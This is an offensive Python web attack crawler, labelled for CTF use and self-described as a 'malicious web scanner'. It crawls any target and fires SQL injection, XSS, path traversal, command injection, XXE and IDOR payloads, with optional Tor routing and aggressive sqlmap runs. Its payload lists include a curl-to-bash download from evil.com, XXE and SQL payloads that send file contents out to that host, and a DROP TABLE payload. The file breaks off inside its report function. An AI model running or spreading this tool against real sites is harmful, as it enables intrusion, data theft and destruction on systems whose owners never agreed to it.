#!/usr/bin/env python3
"""
Enhanced CTF Web Vulnerability Crawler Bot v4.3
Commander-Grade Malicious Web Scanner with Full Features, API, and IDOR Exploitation
"""

import requests
import urllib.parse
import re
import json
import time
import random
import asyncio
import argparse
from urllib.robotparser import RobotFileParser
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from collections import deque, defaultdict
import warnings
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from termcolor import cprint
from datetime import datetime
import os
import base64
import hashlib
import subprocess
import uuid
import secrets

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class EnhancedCTFCrawler:
    def __init__(self, base_url, max_depth=3, max_threads=10, delay=1, timeout=10, tor=False, aggressive=False):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.max_depth = max_depth
        self.max_threads = max_threads
        self.delay = delay / 2 if aggressive else delay
        self.timeout = timeout
        self.tor = tor
        self.aggressive = aggressive

        # Data storage
        self.visited_urls = set()
        self.found_urls = deque()
        self.vulnerabilities = defaultdict(list)
        self.forms = []
        self.directories = set()
        self.files = set()
        self.parameters = set()
        self.cookies = {}
        self.headers_info = {}
        self.response_codes = {}
        self.response_sizes = {}
        self.baseline_404 = None
        self.api_endpoints = defaultdict(list)
        self.idor_candidates = []

        # Session configuration
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
        })

        # Tor proxy setup
        if tor:
            self.session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

        # Retry strategy
        retry_strategy = Retry(total=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Comprehensive payloads
        self.sql_payloads = [
            "' OR 1=1--", "' OR 'a'='a", "1' OR '1'='1", "' UNION SELECT NULL,@@version,USER()--",
            "'; EXEC xp_cmdshell('whoami')--", "' AND SLEEP(5)--",
            "' UNION SELECT table_name, column_name FROM information_schema.columns--",
            "/*!\x2f**/UNION/**/SELECT/**/1,2,3--", "' OR 1=1/*bypass*/--",
            "' AND 1=1%0d%0a--", "'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.evil.com\\test.txt'))--",
            "'; DROP TABLE users; SELECT * FROM information_schema.tables--",
            "' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%')--",
            "'; WAITFOR DELAY '0:0:5'--",
        ]

        self.xss_payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert`XSS`>", "javascript:alert`XSS`//",
            "<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>", "<sCrIpT>alert('XSS')</sCrIpT>",
            "<img src=x oNeRrOr=alert(1)>", "<svg><script>0<1>alert`XSS`</script>",
            "<a href=javascript\\x3Aalert(1)>Click</a>", "<input onfocus=alert('XSS') autofocus>",
            "<b onmouseover=alert('XSS')>Hover</b>", "'';!--\"<XSS>=&{()}",
        ]

        self.lfi_payloads = [
            "../../../../../../etc/passwd", "../../../../../../windows/win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini", "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "..%c0%af..%c0%afetc%c0%afpasswd", "../%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        ]

        self.cmd_payloads = [
            "; whoami", "; id", "; ls -la", "| cat /etc/passwd",
            "| curl http://evil.com/shell.sh | bash", "%3b%20whoami", "$(whoami)", "`id`",
            "; sleep 5", "| ping -c 4 127.0.0.1",
            "; netstat -an; whoami", "| nslookup evil.com",
        ]

        self.xxe_payloads = [
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;%int;]>
<root>&exfil;</root>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>"> %eval; %exfil;]>
<root></root>""",
        ]

        self.idor_payloads = [
            lambda x: str(int(x) + 1),
            lambda x: str(int(x) - 1),
            lambda x: str(uuid.uuid4()),
            lambda x: x[:-4] + secrets.token_hex(2),
            lambda x: str(int(x) + 1000),
            lambda x: str(0),
        ]

        # API patterns
        self.api_patterns = [
            r'/(api|v\d+|rest|graphql)/[\w\-/]+',
            r'/(swagger\.json|openapi\.json|api-docs|swagger-ui)',
            r'/(endpoint|resource|data|auth|profile|users)/[\w\-/]+',
        ]

        # Vulnerability patterns
        self.vuln_patterns = {
            'sql_injection': [r'sql syntax', r'mysql_fetch', r'ORA-\d+', r'PostgreSQL.*error', r'Incorrect syntax near'],
            'xss': [r'alert\(.+\)', r'on\w+=[\'"].*[\'"]', r'<script>.*</script>', r'javascript:'],
            'lfi': [r'root:.*:0:0:', r'\[fonts\]', r'Windows\\System32', r'etc/passwd'],
            'command_injection': [r'uid=\d+\(.*\)', r'root:.*:0:0:', r'PING.*\d+\.\d+\.\d+\.\d+', r'bin/bash'],
            'xxe': [r'root:.*:0:0:', r'\[fonts\]', r'etc/hostname'],
        }

        # Wordlists
        self.directory_wordlist = [
            'admin', 'login', 'api', 'v1', 'v2', 'rest', 'graphql', 'backup',
            'config', 'uploads', 'secure', 'dashboard', 'user', 'auth',
        ]
        self.file_wordlist = [
            'index.php', 'config.php', 'admin.php', 'login.php', 'wp-config.php',
            '.htaccess', '.env', 'web.config', 'robots.txt', 'sitemap.xml',
            'swagger.json', 'openapi.json', 'api-docs', 'phpinfo.php',
        ]
        self.api_wordlist = [
            'api', 'v1', 'v2', 'rest', 'graphql', 'api/v1/users', 'api/v1/auth',
            'api/v1/profile', 'api/v1/admin', 'api/v1/data', 'swagger.json',
            'openapi.json', 'api-docs', 'swagger-ui', 'api/v1/resources',
            'api/v1/transactions', 'api/v1/payments', 'api/v1/login',
        ]

    def banner(self):
        cprint("="*80, 'cyan')
        cprint("       Enhanced CTF Web Vulnerability Crawler Bot v4.3", 'yellow', attrs=['bold'])
        cprint("    Commander-Grade Scanner with Full Features, API & IDOR Exploitation", 'green')
        cprint("="*80, 'cyan')

    def log_message(self, message, color='white', prefix='[INFO]'):
        timestamp = datetime.now().strftime('%H:%M:%S')
        cprint(f"{timestamp} {prefix} {message}", color)

    async def make_request(self, url, method='GET', data=None, params=None, headers=None, allow_redirects=True):
        try:
            headers = headers or {}
            if self.cookies:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.cookies.items())
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, headers=headers, timeout=self.timeout, allow_redirects=allow_redirects)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, params=params, headers=headers, timeout=self.timeout, allow_redirects=allow_redirects)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=headers, timeout=self.timeout, allow_redirects=allow_redirects)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=headers, timeout=self.timeout, allow_redirects=allow_redirects)
            elif method.upper() == 'PATCH':
                response = self.session.patch(url, data=data, headers=headers, timeout=self.timeout, allow_redirects=allow_redirects)
            
            self.response_codes[url] = response.status_code
            self.response_sizes[url] = len(response.content)
            self.headers_info[url] = dict(response.headers)
            
            if not self.baseline_404:
                try:
                    self.baseline_404 = self.session.get(f"{self.base_url}/nonexistent-{random.randint(1000,9999)}").text
                except:
                    pass
            
            return response
        except requests.RequestException as e:
            self.log_message(f"Request failed for {url}: {str(e)}", 'red', '[ERROR]')
            return None

    def is_false_positive_directory(self, url, response):
        if not response:
            return True
        if response.status_code not in [200, 301, 302, 403]:
            return True
        if len(response.content) < 50:
            return True
        if self.baseline_404 and response.text == self.baseline_404:
            return True
        content_lower = response.text.lower()
        not_found_indicators = ['not found', '404', 'page not found', 'file not found']
        return any(indicator in content_lower for indicator in not_found_indicators)

    async def enhanced_directory_scan(self):
        self.log_message("Starting enhanced directory scan...", 'yellow', '[SCAN]')
        found_dirs = []
        
        async def scan_dir(directory):
            url = f"{self.base_url}/{directory}/"
            response = await self.make_request(url)
            if response and not self.is_false_positive_directory(url, response):
                found_dirs.append(url)
                self.directories.add(url)
                self.log_message(f"Directory found: {url} [{response.status_code}]", 'green', '[FOUND]')

        tasks = [scan_dir(directory) for directory in self.directory_wordlist]
        for i in range(0, len(tasks), self.max_threads):
            await asyncio.gather(*tasks[i:i + self.max_threads])
            await asyncio.sleep(self.delay)
        
        return found_dirs

    async def enhanced_file_scan(self):
        self.log_message("Starting enhanced file scan...", 'yellow', '[SCAN]')
        found_files = []

        async def scan_file(filename):
            url = f"{self.base_url}/{filename}"
            response = await self.make_request(url)
            if response and response.status_code == 200 and len(response.content) > 0:
                if not self.is_error_page(response):
                    found_files.append(url)
                    self.files.add(url)
                    self.log_message(f"File found: {url} [{len(response.content)} bytes]", 'green', '[FOUND]')
                    self.analyze_file_content(url, response.text)

        tasks = [scan_file(filename) for filename in self.file_wordlist]
        for i in range(0, len(tasks), self.max_threads):
            await asyncio.gather(*tasks[i:i + self.max_threads])
            await asyncio.sleep(self.delay)

        return found_files

    def is_error_page(self, response):
        error_indicators = ['not found', '404', 'forbidden', '403', 'error', 'access denied']
        content_lower = response.text.lower()
        return any(indicator in content_lower for indicator in error_indicators) and len(response.text) < 2000

    def analyze_file_content(self, url, content):
        patterns = [
            r'password\s*[:=]\s*["\']([^"\']+)["\']',
            r'api[_-]?key\s*[:=]\s*["\']([^"\']+)["\']',
            r'secret\s*[:=]\s*["\']([^"\']+)["\']',
            r'db\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                self.vulnerabilities['sensitive_info'].append({
                    'url': url,
                    'type': 'credential_exposure',
                    'matches': matches,
                    'timestamp': datetime.now().isoformat()
                })
                self.log_message(f"Sensitive info found in {url}: {matches}", 'red', '[VULN]')

    async def detect_api_endpoints(self, url, content):
        self.log_message(f"Scanning for API endpoints at {url}", 'blue', '[API]')
        endpoints = []

        # Regex-based detection
        for pattern in self.api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                endpoint = urljoin(self.base_url, match)
                if endpoint not in self.api_endpoints:
                    self.api_endpoints[endpoint].append({'method': 'GET', 'source': 'regex'})
                    endpoints.append(endpoint)

        # Wordlist-based detection
        async def test_endpoint(endpoint):
            test_url = f"{self.base_url}/{endpoint}"
            response = await self.make_request(test_url, method='GET')
            if response and response.status_code in [200, 201, 400, 401, 403]:
                content_type = response.headers.get('Content-Type', '').lower()
                if 'json' in content_type or 'xml' in content_type:
                    self.api_endpoints[test_url].append({
                        'method': 'GET',
                        'source': 'wordlist',
                        'content_type': content_type,
                        'status': response.status_code
                    })
                    self.log_message(f"API endpoint found: {test_url} [{response.status_code}]", 'green', '[API]')

        tasks = [test_endpoint(endpoint) for endpoint in self.api_wordlist]
        for i in range(0, len(tasks), self.max_threads):
            await asyncio.gather(*tasks[i:i + self.max_threads])
            await asyncio.sleep(self.delay)

        # Swagger/OpenAPI parsing
        swagger_urls = ['swagger.json', 'openapi.json', 'api-docs']
        for swagger in swagger_urls:
            swagger_url = f"{self.base_url}/{swagger}"
            response = await self.make_request(swagger_url)
            if response and response.status_code == 200 and 'json' in response.headers.get('Content-Type', '').lower():
                try:
                    swagger_data = json.loads(response.text)
                    paths = swagger_data.get('paths', {})
                    for path, methods in paths.items():
                        endpoint = urljoin(self.base_url, path)
                        for method in methods.keys():
                            self.api_endpoints[endpoint].append({
                                'method': method.upper(),
                                'source': 'swagger',
                                'status': None
                            })
                            endpoints.append(endpoint)
                    self.log_message(f"Swagger endpoints extracted from {swagger_url}", 'green', '[API]')
                except json.JSONDecodeError:
                    pass

        return endpoints

    async def exploit_api_endpoint(self, endpoint, methods):
        self.log_message(f"Exploiting API endpoint: {endpoint}", 'magenta', '[EXPLOIT]')
        for method_info in methods:
            method = method_info['method']
            headers = {'Content-Type': 'application/json'}
            if self.cookies:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.cookies.items())

            # Test unauthenticated access
            response = await self.make_request(endpoint, method=method, headers=headers)
            if response and response.status_code in [200, 201]:
                self.vulnerabilities['api_unauthenticated'].append({
                    'endpoint': endpoint,
                    'method': method,
                    'status': response.status_code,
                    'evidence': response.text[:100],
                    'timestamp': datetime.now().isoformat()
                })
                self.log_message(f"Unauthenticated {method} access on {endpoint}", 'red', '[VULN]')

            # Fuzz parameters
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            for param in params.keys():
                await self.test_sql_injection_advanced(endpoint, param)
                await self.test_xss_advanced(endpoint, param)
                await self.test_command_injection(endpoint, param)
                await self.test_idor(endpoint, response.text if response else '')

            # Test JSON body vulnerabilities
            if method in ['POST', 'PUT', 'PATCH']:
                for payload in self.sql_payloads + self.xss_payloads + self.cmd_payloads:
                    try:
                        data = json.dumps({param: payload for param in params.keys() or ['test']})
                        response = await self.make_request(endpoint, method=method, data=data, headers=headers)
                        if response and any(p in response.text.lower() for p in self.vuln_patterns.values()):
                            self.vulnerabilities['api_injection'].append({
                                'endpoint': endpoint,
                                'method': method,
                                'payload': payload,
                                'evidence': response.text[:100],
                                'timestamp': datetime.now().isoformat()
                            })
                            self.log_message(f"Injection found in {method} {endpoint}: {payload[:30]}...", 'red', '[VULN]')
                    except json.JSONDecodeError:
                        pass

    async def test_idor(self, url, content):
        self.log_message(f"Testing for IDOR at {url}", 'blue', '[IDOR]')
        identifiers = []
        try:
            # JSON response
            if 'json' in self.headers_info.get(url, {}).get('Content-Type', '').lower():
                data = json.loads(content)
                identifiers.extend(self.extract_identifiers(data))
            # URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param, values in params.items():
                for value in values:
                    if self.is_identifier(value):
                        identifiers.append((param, value))
        except (json.JSONDecodeError, TypeError):
            self.log_message(f"Invalid JSON or content at {url}, skipping IDOR JSON parsing", 'yellow', '[WARN]')
            pass

        # Test IDOR
        for identifier in identifiers:
            if isinstance(identifier, tuple):
                param, value = identifier
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                for payload_func in self.idor_payloads:
                    try:
                        new_value = payload_func(value)
                        test_response = await self.make_request(base_url, params={param: new_value})
                        if test_response and test_response.status_code == 200:
                            original_response = await self.make_request(base_url, params={param: value})
                            if original_response and test_response.text != original_response.text:
                                self.vulnerabilities['idor'].append({
                                    'url': url,
                                    'parameter': param,
                                    'original_value': value,
                                    'test_value': new_value,
                                    'evidence': test_response.text[:100],
                                    'timestamp': datetime.now().isoformat()
                                })
                                self.log_message(f"IDOR confirmed: {base_url}?{param}={new_value}", 'red', '[VULN]')
                                # Chain with session hijacking
                                await self.test_session_hijacking(base_url)
                    except (ValueError, TypeError):
                        self.log_message(f"Invalid IDOR payload for {value} at {url}", 'yellow', '[WARN]')
        return identifiers

    def extract_identifiers(self, data):
        identifiers = []
        if isinstance(data, dict):
            for key, value in data.items():
                if self.is_identifier(str(value)):
                    identifiers.append((key, str(value)))
                if isinstance(value, (dict, list)):
                    identifiers.extend(self.extract_identifiers(value))
        elif isinstance(data, list):
            for item in data:
                identifiers.extend(self.extract_identifiers(item))
        return identifiers

    def is_identifier(self, value):
        try:
            int(value)
            return True
        except (ValueError, TypeError):
            pass
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.IGNORECASE):
            return True
        if re.match(r'^[0-9a-f]{32}$', value, re.IGNORECASE):
            return True
        return False

    async def test_sql_injection_advanced(self, url, param):
        self.log_message(f"Testing SQL injection on parameter '{param}' at {url}", 'blue', '[TEST]')
        vulnerable = False
        original_response = await self.make_request(url, params={param: 'normal_value'})
        if not original_response:
            return False

        async def test_payload(payload):
            start_time = time.time()
            test_response = await self.make_request(url, params={param: payload})
            response_time = time.time() - start_time
            if not test_response:
                return False

            for pattern in self.vuln_patterns['sql_injection']:
                if re.search(pattern, test_response.text, re.IGNORECASE):
                    self.vulnerabilities['sql_injection'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'error_based',
                        'evidence': re.search(pattern, test_response.text, re.IGNORECASE).group(0)[:100],
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"SQL Injection confirmed: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True

            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                if response_time > 4:
                    self.vulnerabilities['sql_injection'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'time_based',
                        'response_time': response_time,
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Time-based SQL Injection found: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True

            if len(test_response.text) != len(original_response.text):
                true_payload = payload.replace('1=2', '1=1').replace("'1'='2'", "'1'='1'")
                false_payload = payload.replace('1=1', '1=2').replace("'1'='1'", "'1'='2'")
                if true_payload != payload:
                    true_response = await self.make_request(url, params={param: true_payload})
                    false_response = await self.make_request(url, params={param: false_payload})
                    if true_response and false_response and len(true_response.text) != len(false_response.text):
                        self.vulnerabilities['sql_injection'].append({
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'boolean_based',
                            'timestamp': datetime.now().isoformat()
                        })
                        self.log_message(f"Boolean-based SQL Injection found: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                        return True
            return False

        for payload in self.sql_payloads:
            if await test_payload(payload):
                vulnerable = True
                if self.aggressive:
                    self.run_sqlmap(url, param)
            await asyncio.sleep(self.delay)
        
        return vulnerable

    def run_sqlmap(self, url, param):
        self.log_message(f"Running sqlmap on {url} for parameter {param}", 'magenta', '[SQLMAP]')
        try:
            cmd = [
                'sqlmap', '-u', url, '--data', f"{param}=test", '--batch', '--level=3', '--risk=3',
                '--random-agent', '--output-dir', 'sqlmap_output', '--tamper=space2comment'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if 'vulnerable' in result.stdout.lower():
                self.vulnerabilities['sql_injection'].append({
                    'url': url,
                    'parameter': param,
                    'type': 'sqlmap_confirmed',
                    'evidence': result.stdout[:200],
                    'timestamp': datetime.now().isoformat()
                })
                self.log_message(f"sqlmap confirmed SQLi: {url}", 'red', '[VULN]')
        except Exception as e:
            self.log_message(f"sqlmap error: {str(e)}", 'red', '[ERROR]')

    async def test_xss_advanced(self, url, param):
        self.log_message(f"Testing XSS on parameter '{param}' at {url}", 'blue', '[TEST]')
        vulnerable = False

        async def test_payload(payload):
            test_response = await self.make_request(url, params={param: payload})
            if not test_response:
                return False

            if payload in test_response.text:
                context = self.analyze_xss_context(test_response.text, payload)
                if context['exploitable']:
                    self.vulnerabilities['xss'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'reflected',
                        'context': context['context'],
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"XSS confirmed: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True
            return False

        for payload in self.xss_payloads:
            if await test_payload(payload):
                vulnerable = True
            await asyncio.sleep(self.delay)

        return vulnerable

    def analyze_xss_context(self, html_content, payload):
        soup = BeautifulSoup(html_content, 'html.parser')
        for i, char in enumerate(html_content):
            if html_content[i:i+len(payload)] == payload:
                start = max(0, i - 100)
                end = min(len(html_content), i + len(payload) + 100)
                context = html_content[start:end]
                if '<script' in context and '</script>' in context:
                    return {'exploitable': True, 'context': 'script_tag'}
                if 'onclick=' in context or 'onload=' in context or 'onmouseover=' in context:
                    return {'exploitable': True, 'context': 'event_handler'}
                return {'exploitable': False, 'context': 'text_content'}
        return {'exploitable': False, 'context': 'not_found'}

    async def test_directory_traversal_advanced(self, url, param):
        self.log_message(f"Testing directory traversal on parameter '{param}' at {url}", 'blue', '[TEST]')
        vulnerable = False

        async def test_payload(payload):
            test_response = await self.make_request(url, params={param: payload})
            if not test_response:
                return False

            success_indicators = [
                r'root:.*:0:0:', r'127\.0\.0\.1\s+localhost', r'\[fonts\]', r'\[boot loader\]',
                r'Windows\\System32', r'etc/passwd'
            ]
            for indicator in success_indicators:
                if re.search(indicator, test_response.text, re.IGNORECASE):
                    self.vulnerabilities['directory_traversal'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': re.search(indicator, test_response.text, re.IGNORECASE).group(0)[:100],
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Directory traversal confirmed: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True
            return False

        for payload in self.lfi_payloads:
            if await test_payload(payload):
                vulnerable = True
            await asyncio.sleep(self.delay)
        return vulnerable

    async def test_command_injection(self, url, param):
        self.log_message(f"Testing command injection on parameter '{param}' at {url}", 'blue', '[TEST]')
        vulnerable = False

        async def test_payload(payload):
            start_time = time.time()
            test_response = await self.make_request(url, params={param: payload})
            response_time = time.time() - start_time
            if not test_response:
                return False

            cmd_indicators = [r'uid=\d+\(.*\)', r'root:.*:0:0:', r'PING.*\d+\.\d+\.\d+\.\d+', r'bin/bash']
            for indicator in cmd_indicators:
                if re.search(indicator, test_response.text, re.IGNORECASE):
                    self.vulnerabilities['command_injection'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': re.search(indicator, test_response.text, re.IGNORECASE).group(0)[:100],
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Command injection confirmed: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True
            if 'sleep' in payload.lower() or 'ping' in payload.lower():
                if response_time > 4:
                    self.vulnerabilities['command_injection'].append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'time_based',
                        'response_time': response_time,
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Time-based command injection found: {url}?{param}={payload[:30]}...", 'red', '[VULN]')
                    return True
            return False

        for payload in self.cmd_payloads:
            if await test_payload(payload):
                vulnerable = True
            await asyncio.sleep(self.delay)
        return vulnerable

    async def test_xxe_injection(self, url):
        self.log_message(f"Testing XXE injection at {url}", 'blue', '[TEST]')
        for payload in self.xxe_payloads:
            headers = {'Content-Type': 'application/xml'}
            test_response = await self.make_request(url, method='POST', data=payload, headers=headers)
            if test_response:
                xxe_indicators = [r'root:.*:0:0:', r'\[fonts\]', r'etc/hostname']
                for indicator in xxe_indicators:
                    if re.search(indicator, test_response.text, re.IGNORECASE):
                        self.vulnerabilities['xxe'].append({
                            'url': url,
                            'payload': payload,
                            'evidence': re.search(indicator, test_response.text, re.IGNORECASE).group(0)[:100],
                            'timestamp': datetime.now().isoformat()
                        })
                        self.log_message(f"XXE injection confirmed: {url}", 'red', '[VULN]')
            await asyncio.sleep(self.delay)

    async def test_session_hijacking(self, url):
        self.log_message(f"Testing session hijacking at {url}", 'blue', '[TEST]')
        if self.cookies:
            for name, value in self.cookies.items():
                test_response = await self.make_request(url, headers={'Cookie': f"{name}={value}"})
                if test_response and any(keyword in test_response.text.lower() for keyword in ['admin', 'dashboard', 'privileged']):
                    self.vulnerabilities['session_hijacking'].append({
                        'url': url,
                        'cookie': f"{name}={value}",
                        'evidence': 'Privileged access detected',
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Session hijacking possible: {url} with cookie {name}", 'red', '[VULN]')

    async def crawl_url(self, url, depth=0):
        if depth > self.max_depth or url in self.visited_urls:
            return
        self.visited_urls.add(url)
        self.log_message(f"Crawling: {url} (depth: {depth})", 'cyan', '[CRAWL]')
        response = await self.make_request(url)
        if not response:
            return

        self.check_security_headers(response)
        self.check_vulnerabilities(response.text, url)
        self.extract_forms(response.text, url)
        self.extract_parameters(url)
        await self.detect_api_endpoints(url, response.text)
        await self.test_idor(url, response.text)
        if any(endpoint in url.lower() for endpoint in ['api', 'xml', 'soap', 'rest', 'graphql']):
            await self.test_xxe_injection(url)
        await self.test_session_hijacking(url)

        new_urls = self.extract_urls(response.text, url)
        for new_url in new_urls:
            if new_url not in self.visited_urls:
                self.found_urls.append((new_url, depth + 1))

    def extract_urls(self, html_content, base_url):
        urls = set()
        soup = BeautifulSoup(html_content, 'html.parser')
        for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
            for attr in ['href', 'src', 'action']:
                if tag.get(attr):
                    url = urljoin(base_url, tag.get(attr))
                    if self.is_valid_url(url):
                        urls.add(url)
        return urls

    def is_valid_url(self, url):
        parsed = urlparse(url)
        if parsed.netloc != self.domain:
            return False
        if url in self.visited_urls:
            return False
        skip_extensions = ['.jpg', '.png', '.gif', '.css', '.js', '.woff', '.ttf']
        return not any(url.lower().endswith(ext) for ext in skip_extensions) and parsed.scheme in ['http', 'https']

    def extract_forms(self, html_content, url):
        soup = BeautifulSoup(html_content, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                'url': url,
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                form_data['inputs'].append({
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
                if input_tag.get('name'):
                    self.parameters.add(input_tag.get('name'))
            self.forms.append(form_data)

    def extract_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params.keys():
            self.parameters.add(param)

    def check_vulnerabilities(self, content, url):
        for vuln_type, patterns in self.vuln_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content.lower(), re.IGNORECASE):
                    self.vulnerabilities[vuln_type].append({
                        'url': url,
                        'pattern': pattern,
                        'evidence': re.search(pattern, content, re.IGNORECASE).group(0)[:100],
                        'timestamp': datetime.now().isoformat()
                    })
                    self.log_message(f"Potential {vuln_type.replace('_', ' ').title()} found at {url}", 'yellow', '[PATTERN]')

    def check_security_headers(self, response):
        security_headers = {
            'x-frame-options': 'Clickjacking protection',
            'x-content-type-options': 'MIME type sniffing protection',
            'content-security-policy': 'Script execution control',
            'strict-transport-security': 'HSTS enforcement',
            'x-xss-protection': 'XSS filtering'
        }
        missing_headers = []
        for header, desc in security_headers.items():
            if header.lower() not in (h.lower() for h in response.headers):
                missing_headers.append({'header': header, 'description': desc})
        if missing_headers:
            self.vulnerabilities['missing_security_headers'].append({
                'url': response.url,
                'missing_headers': missing_headers,
                'timestamp': datetime.now().isoformat()
            })
            self.log_message(f"Missing security headers at {response.url}: {', '.join(h['header'] for h in missing_headers)}", 'yellow', '[WARN]')

    async def run_vulnerability_tests(self):
        self.log_message("Running comprehensive vulnerability tests...", 'yellow', '[TEST]')
        for url in self.visited_urls:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                for param in params.keys():
                    await self.test_sql_injection_advanced(base_url, param)
                    await self.test_xss_advanced(base_url, param)
                    await self.test_directory_traversal_advanced(base_url, param)
                    await self.test_command_injection(base_url, param)
                    await self.test_idor(base_url, (await self.make_request(base_url)).text if await self.make_request(base_url) else '')
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    await self.test_sql_injection_advanced(form['action'], input_field['name'])
                    await self.test_xss_advanced(form['action'], input_field['name'])
                    await self.test_directory_traversal_advanced(form['action'], input_field['name'])
                    await self.test_command_injection(form['action'], input_field['name'])
        for endpoint, methods in self.api_endpoints.items():
            await self.exploit_api_endpoint(endpoint, methods)

    async def crawl(self):
        self.banner()
        self.log_message(f"Starting enhanced crawl of {self.base_url}", 'green', '[START]')

        # Check robots.txt
        rp = RobotFileParser()
        rp.set_url(f"{self.base_url}/robots.txt")
        try:
            rp.read()
        except:
            self.log_message("Failed to read robots.txt", 'yellow', '[WARN]')

        self.found_urls.append((self.base_url, 0))
        
        while self.found_urls:
            batch = []
            for _ in range(min(self.max_threads, len(self.found_urls))):
                if self.found_urls:
                    batch.append(self.found_urls.popleft())
            
            tasks = [self.crawl_url(url, depth) for url, depth in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(self.delay)
        
        await self.enhanced_directory_scan()
        await self.enhanced_file_scan()
        await self.run_vulnerability_tests()

    def generate_enhanced_report(self, output_file=None):
        report = {
            'target': self.base_url,
            'scan_time': datetime.now().isoformat(),
            'statistics': {
                'urls_crawled': len(self.visited_urls),
                'forms_found': len(self.forms),
                'api_endpoints_found': len(self.api_endpoints),
                'directories_found': len(self.directories),
                'files_found': len(self.files),
                'parameters_found': len(self.parameters),
                'vulnerabilities_found': sum(len(v) for v in self.vulnerabilities.values())
            },
            'vulnerabilities': dict(self.vulnerabilities),
            'forms': self.forms,
            'directories': list(self.directories),
            'files': list(self.files),
            'api_endpoints': dict(self.api_endpoints),
            'cookies': dict(self.cookies),
            'headers_info': dict(self.headers_info)
        }
        
        cprint("\n" + "="*80, 'cyan')
        cprint("                    SCAN SUMMARY", 'yellow', attrs=['bold'])
        cprint("="*80, 'cyan')
        for key, value in report['statistics'].items():
            cprint(f"   {key.replace('_', ' ').title()}: {value}", 'white')
        for vuln_type, vulns in report['vulnerabilities'].items():
            if vulns:
